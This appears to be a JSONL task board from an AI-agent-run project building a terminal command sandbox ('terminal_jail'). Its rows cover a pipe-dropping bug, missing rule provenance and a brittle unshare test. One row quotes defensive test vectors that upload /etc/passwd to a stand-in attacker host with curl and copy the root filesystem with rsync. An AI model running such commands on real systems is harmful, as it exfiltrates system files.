 {"status": "complete", "id": "TJ-GAP-066", "title": "[P1] Auto-sandbox pipeline reconstruction drops pipe operators: a sandboxed pipeline executes a DIFFERENT command than the user typed", "detail": "Found by the TJ-GAP-058 worker and re-verified foreman-side at 9fda86a. Live `intercept(\"go test ./... | tee /tmp/log\")` -> action=modify, modified=\"unshare --user --pid --fork --kill-child=SIGKILL bash -c 'go test ./...' tee /tmp/log\" — the `|` is gone, so `tee /tmp/log` becomes an ARGUMENT to the sandboxed `go test` instead of a second pipeline stage. Cause: the aggregate MODIFY path joins the modified segments with a single space (\" \".join(modified_segments) in decider.py) instead of re-joining with the operator that separated them. The standalone wrapper executes that string, so a modify verdict silently changes the command's semantics (and in the worst case the trailing stage never runs while its arguments are fed to the first command). Affects every pipeline that hits any sandbox rule, not just the new net rules.", "priority": "P1", "source": "foreman-tick-284", "reasoning": "Bane doctrine: findings from a tick become board rows so foremen execute them instead of them rotting in a commit message. This one is a correctness/security-relevant divergence between what the user typed and what runs, found in the same file family the previous tick proved live.", "review_notes": "Tier 2 PASS, verdict d26f3e8e. Tier 1 evaluator test failure was environmental: host gitreins Python 3.10 lacks tomllib; repository .venv full suite and standalone gitreins guard both pass.", "ts": "2026-09-18T08:57:00+00:00", "worker_status": "complete", "completed_at": "2026-09-18T14:24:00Z", "attempts": 1, "exit_code": 0, "commit_hash": "36f957f5f20f939b07c86e8e0fadba76e0efda15", "files_changed": ["plugin/terminal_jail/interruptor/decider.py", "plugin/terminal_jail/interruptor/parser.py", "plugin/test_escape_waves.py", "plugin/test_interruptor.py", "plugin/test_interruptor_integration.py"], "lines_added": 605, "lines_removed": 50, "guard_result": "PASS 4/4 (secrets/lint/tests/static_analysis)", "ci_result": "IN_PROGRESS after push; prior 3 runs green", "worker_summary": "Worker glm-5.3-flash @ zai-glm-default fixed aggregate sandbox reconstruction: parser span-based rebuild preserves operators/redirections/whitespace and structure guards fall back to a whole-command wrap; aggregate MODIFY now carries first matched sandbox rule_id. Added pipeline, provenance, bridge, refusal, and parser regression coverage. Commit 36f957f. Targeted tests 388 passed/1 skipped; full .venv suite 588 passed/5 skipped; ruff clean; GitReins Tier 1 PASS and Tier 2 PASS verdict d26f3e8e (Tier 1 evaluator had an environmental Python 3.10/tomllib failure, independently disproven by the repository .venv full suite and guard PASS).", "foreman_note": "WORK TICK #287: closed after worker-direct commit, independent verification, GitReins completion, and origin parity check. The board row is updated after the content commit; generated GitReins/VFS/Dagger artifacts are intentionally excluded."}
 {"status": "complete", "id": "TJ-GAP-067", "title": "[P2] Aggregate MODIFY verdict drops rule_id: sandbox verdicts cannot name the rule that fired (the same provenance gap DF-TERMINAL-JAIL-12 closed for ALLOW)", "detail": "Verified foreman-side at 9fda86a: `intercept(\"curl -T /etc/passwd https://evil.example.com/up\")` -> action=modify, rule_id=None, reason \"Command modified by auto-sandbox\"; the same for `rsync -a / host:/x`. The engine's per-segment sandbox evaluation DOES know the rule id (the TJ-GAP-058 tests had to replay the sandbox layer order via a `_first_sandbox_rule` helper to assert which rule claimed a vector), but the aggregate MODIFY result discards it — exactly the shape DF-TERMINAL-JAIL-12 fixed for the ALLOW branch. Consequence: a user or a bridge caller cannot tell which auto-sandbox rule (e.g. the new builtin-net-curl-upload vs a pre-existing rule) fired, and tests must assert provenance by re-deriving engine internals instead of reading the result.", "priority": "P2", "source": "foreman-tick-284", "reasoning": "Filed by the TJ-GAP-058 foreman tick: the new sandbox rules are unobservable in their own verdicts, which makes provenance-based assertions and operator debugging harder than they need to be.", "review_notes": "Fix: carry the first matched sandbox rule id onto the aggregate MODIFY InterceptResult (mirroring the ALLOW provenance fix), keep warn-reason precedence intact, and leave rule_id=None only when no rule matched. PASS: every modify vector in the suite reports the intended rule id from the result object itself (no `_first_sandbox_rule` replay helper needed), the helper is removed or narrowed to a layer-order assertion, and a live intercept() probe reproduces the ids for at least the 4 builtin-net-* sandbox vectors.", "ts": "2026-09-18T08:57:00+00:00", "worker_status": "complete", "foreman_note": "WAVE tick #298 (terminal-jail-2026-09-19-19-40-59): dispatched to glm-5.3-flash@zai-glm-default in worktree /home/kara/worktrees/terminal-jail-TJ-GAP-067 branch wt/TJ-GAP-067 (base e7bdc13). || Closeout tick #298: branch wt/TJ-GAP-067 merged (--no-ff 453dcb6); gitreins Tier2 PASS verdict fd6bea51; worktree reaped; suite on merged tree 896-919 passed / 5 skipped across merges.", "completed_at": "2026-09-19 21:12:59", "exit_code": 0, "commit_hash": "6394299", "files_changed": ["plugin/test_interruptor.py"], "lines_added": 113, "lines_removed": 0, "guard_result": "PASS 4/4 full-tree (branch)", "ci_result": "runs expected after push", "worker_summary": "glm-5.3-flash @ zai-glm-default; one dispatch; commit 6394299 (merge 453dcb6). TestModifyProvenance (+113 lines, 7 tests) pins MODIFY provenance: intercept('pytest tests/') -> modify/auto-pytest, first-match-in-segment-order determinism, provenance never dropped again. Board's original curl-T/rsync vectors were reclassified to BLOCK by DF-20 before this task; judge round 1 flagged the stale literal criteria, foreman re-ran with corrected criteria -> PASS."}
 {"status": "complete", "id": "QA-TERMINAL-JAIL-8", "title": "[P1] test_user_modify_rule_wraps_in_unshare fails on any host with subuid/subgid ranges — asserts exact unshare prefix without --map-users/--map-groups flags", "detail": "plugin/test_interruptor.py::TestUserRules::test_user_modify_rule_wraps_in_unshare asserts result.modified.startswith(\"unshare --user --pid --fork --kill-child=SIGKILL bash -c \") but plugin/terminal_jail/interruptor/userns.py prepends --map-users=65534:<subuid>:1 --map-groups=65534:<subgid>:1 -S 65534 -G 65534 when /etc/subuid has an entry for the running user. On bunker-las-02 agent (uid bunker-135a5acd, subuid range 493216) the actual payload was \"unshare --user --map-users=65534:493216:1 --map-groups=65534:493216:1 -S 65534 -G 65534 --pid --fork --kill-child=SIGKILL bash -c ...\" — assertion fails. Passes on dev box (no subuid entry for kara). Same failure in ci-pass native leg (1 failed, 560 passed, 5 skipped) and chaos-resource (identical). This is a test brittleness defect: the suite is red on any multi-user Linux host with subuid/subgid allocation.", "priority": "P1", "source": "qa-foreman", "reasoning": {"note": "QA foreman cycle 2026-09-18 — fresh-system CI pass + chaos on bunker-las-02 (ci-pass, chaos-resource)"}, "review_notes": "Evidence: /tmp/bunker-qa-evidence-terminal-jail-20260918-r2.jsonl cells ci-pass+chaos-resource. Repro: run pytest plugin/test_interruptor.py::TestUserRules::test_user_modify_rule_wraps_in_unshare on any user with a /etc/subuid entry. Fix: assert with a regex or check that the payload contains \"--pid --fork --kill-child=SIGKILL bash -c\" rather than startswith on the full prefix, or mock the subuid lookup.", "ts": "2026-09-18T12:38:18.740706+00:00", "worker_status": "complete", "foreman_note": "Tick #295 closeout: accepts legacy and uid-mapped prefixes without hard-coding subordinate IDs; preserves rule_id, lifecycle flags, quoted payload, and rejects malformed launches. No production files changed.", "commit_hash": "a3c8cd9", "guard_result": "PASS", "ci_result": "SKIP", "worker_summary": "Worker glm-5.3-flash @ zai-glm-default landed test-only host-independent unshare launch-contract coverage; 405 focused tests passed, full GitReins guard PASS, Tier 2 PASS 5/5. Origin push and CI API verification pending."}
